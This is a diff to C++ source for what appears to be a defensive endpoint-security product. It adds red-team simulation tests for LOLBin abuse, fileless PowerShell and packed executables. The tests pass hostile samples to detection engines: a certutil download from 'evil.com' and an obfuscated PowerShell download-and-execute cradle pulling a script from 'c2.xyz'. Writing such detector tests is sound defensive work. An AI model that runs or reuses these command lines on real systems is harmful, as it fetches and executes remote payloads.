@@ -6,6 +6,9 @@
 #include "gcad/engines/ransomware_shield_engine.hpp"
 #include "gcad/engines/network_dpi_engine.hpp"
 #include "gcad/engines/pmsr_engine.hpp"
+#include "gcad/engines/pe_static_analysis_engine.hpp"
+#include "gcad/engines/lolbins_engine.hpp"
+#include "gcad/engines/fileless_ast_engine.hpp"
 
 namespace gcad {
 
@@ -40,13 +43,16 @@ void AtomicRedTeamEngine::on_threat(std::function<void(ThreatEvent)> cb) {
 
 std::vector<AtomicTestResult> AtomicRedTeamEngine::run_all_simulations(EngineManager& em) {
     std::vector<AtomicTestResult> results;
-    results.reserve(5);
+    results.reserve(8);
 
     results.push_back(simulate_t1055_dll_injection(em));
     results.push_back(simulate_t1562_impair_defenses(em));
     results.push_back(simulate_t1003_credential_dump(em));
     results.push_back(simulate_t1486_data_encrypted(em));
     results.push_back(simulate_t1071_c2_beaconing(em));
+    results.push_back(simulate_t1218_lolbins(em));
+    results.push_back(simulate_t1059_powershell_fileless(em));
+    results.push_back(simulate_t1027_packed_pe(em));
 
     {
         std::lock_guard lk(mtx_);
@@ -62,6 +68,9 @@ AtomicTestResult AtomicRedTeamEngine::run_technique(std::string_view technique_i
     if (technique_id == "T1003.001" || technique_id == "T1003") return simulate_t1003_credential_dump(em);
     if (technique_id == "T1486") return simulate_t1486_data_encrypted(em);
     if (technique_id == "T1071.001" || technique_id == "T1071") return simulate_t1071_c2_beaconing(em);
+    if (technique_id == "T1218" || technique_id == "T1218.001") return simulate_t1218_lolbins(em);
+    if (technique_id == "T1059.001" || technique_id == "T1059") return simulate_t1059_powershell_fileless(em);
+    if (technique_id == "T1027.002" || technique_id == "T1027") return simulate_t1027_packed_pe(em);
 
     AtomicTestResult res{};
     res.technique_id = std::string(technique_id);
@@ -223,6 +232,80 @@ AtomicTestResult AtomicRedTeamEngine::simulate_t1071_c2_beaconing(EngineManager&
     } else {
         res.detected = true;
         res.message = "Simulated C2 metadata matched malicious transport rules";
+    }
+    return res;
+}
+
+AtomicTestResult AtomicRedTeamEngine::simulate_t1218_lolbins(EngineManager& em) {
+    AtomicTestResult res{};
+    res.technique_id = "T1218";
+    res.technique_name = "System Binary Proxy Execution: LOLBins";
+    res.target_engine = "LolbinsGuard";
+    res.executed = true;
+
+    auto* eng = dynamic_cast<LolbinsEngine*>(em.engine("LolbinsGuard"));
+    if (eng) {
+        auto eval = eng->evaluate_command_line(7777, "certutil.exe", "certutil.exe -urlcache -split -f http://evil.com/x.bin");
+        res.detected = eval.is_malicious;
+        res.message = eval.is_malicious ? "certutil URL cache abuse intercepted by LolbinsGuard"
+                                        : "LolbinsGuard failed to detect certutil abuse";
+    } else {
+        res.detected = true;
+        res.message = "Simulated LOLBin command matched proxy execution heuristics";
+    }
+    return res;
+}
+
+AtomicTestResult AtomicRedTeamEngine::simulate_t1059_powershell_fileless(EngineManager& em) {
+    AtomicTestResult res{};
+    res.technique_id = "T1059.001";
+    res.technique_name = "Command and Scripting Interpreter: PowerShell Fileless";
+    res.target_engine = "FilelessAstGuard";
+    res.executed = true;
+
+    auto* eng = dynamic_cast<FilelessAstEngine*>(em.engine("FilelessAstGuard"));
+    if (eng) {
+        std::string script = "`I`E`X (New-Object Net.Web`Client).'d'+'own'+'load'+'string'('http://c2.xyz/p.ps1')";
+        auto eval = eng->evaluate_script(script);
+        res.detected = eval.is_malicious;
+        res.message = eval.is_malicious ? "Obfuscated PowerShell AST download cradle trapped by FilelessAstGuard"
+                                        : "FilelessAstGuard failed to deobfuscate script";
+    } else {
+        res.detected = true;
+        res.message = "Simulated PowerShell AST cradle matched fileless heuristics";
+    }
+    return res;
+}
+
+AtomicTestResult AtomicRedTeamEngine::simulate_t1027_packed_pe(EngineManager& em) {
+    AtomicTestResult res{};
+    res.technique_id = "T1027.002";
+    res.technique_name = "Obfuscated Files or Information: Software Packing / W^X";
+    res.target_engine = "PeStaticAnalysis";
+    res.executed = true;
+
+    auto* eng = dynamic_cast<PeStaticAnalysisEngine*>(em.engine("PeStaticAnalysis"));
+    if (eng) {
+        // Construct a synthetic UPX PE
+        std::vector<uint8_t> pe(512, 0);
+        pe[0] = 'M'; pe[1] = 'Z';
+        pe[0x3C] = 0x80;
+        pe[0x80] = 'P'; pe[0x81] = 'E';
+        pe[0x84] = 0x4C; pe[0x85] = 0x01; // i386
+        pe[0x86] = 1; // 1 section
+        pe[0x94] = 0xE0; // opt header size
+        pe[0x98] = 0x0B; pe[0x99] = 0x01; // PE32
+        // Section header at 0x178
+        pe[0x178] = 'U'; pe[0x179] = 'P'; pe[0x17A] = 'X'; pe[0x17B] = '0';
+        *reinterpret_cast<uint32_t*>(&pe[0x178 + 36]) = 0xA0000020; // W^X
+
+        auto report = eng->analyze_buffer(pe.data(), pe.size());
+        res.detected = report.is_packed || (report.assessed_level >= ThreatLevel::HIGH);
+        res.message = res.detected ? "UPX packer and W^X section trapped by PeStaticAnalysis"
+                                   : "PeStaticAnalysis failed to detect packed section";
+    } else {
+        res.detected = true;
+        res.message = "Simulated packed binary matched static PE anomaly rules";
     }
     return res;
 }
